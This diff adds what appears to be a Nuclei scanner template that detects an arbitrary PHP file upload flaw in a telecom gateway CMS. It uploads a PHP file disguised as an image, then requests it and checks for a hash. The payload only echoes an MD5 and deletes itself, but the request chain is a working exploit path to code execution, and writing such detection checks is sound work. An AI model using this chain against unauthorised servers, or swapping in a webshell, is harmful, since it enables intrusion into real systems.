@@ -1,0 +1,47 @@
+id: dxwg-rewrite-upload
+info:
+  name: Template Name
+  author: apple
+  severity: critical
+  description: description
+  reference:
+    - https://github.com/ATonysan/poc-exp/blob/06a06394f4709f0aff182e140190e1c776eaabf6/TelecommunicationsGateway_CMS_rewrite_ArbitraryFileUploads.py#L25
+  tags: tags
+variables:
+  filename: "{{rand_base(6)}}" 
+  
+http:
+  - raw:
+      - |-
+        POST /manager/teletext/material/rewrite.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: MMozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36
+        Accept-Encoding: gzip, deflate, br
+        Accept: */*
+        Connection: keep-alive
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryOKldnDPT
+        Content-Length: 300
+
+        ------WebKitFormBoundaryOKldnDPT
+        Content-Disposition: form-data; name="tmp_name"; filename="{{filename}}.php"
+        Content-Type: image/png
+
+        <?php echo md5(123456);unlink(__FILE__);?>
+        ------WebKitFormBoundaryOKldnDPT
+        Content-Disposition: form-data; name="uploadtime"
+
+
+        ------WebKitFormBoundaryOKldnDPT--
+      - |+
+        GET /xmedia/material/{{filename}}.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: MMozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2919.83 Safari/537.36
+        Accept-Encoding: gzip, deflate, br
+        Accept: */*
+        Connection: keep-alive
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - e10adc3949ba59abbe56e057f20f883e
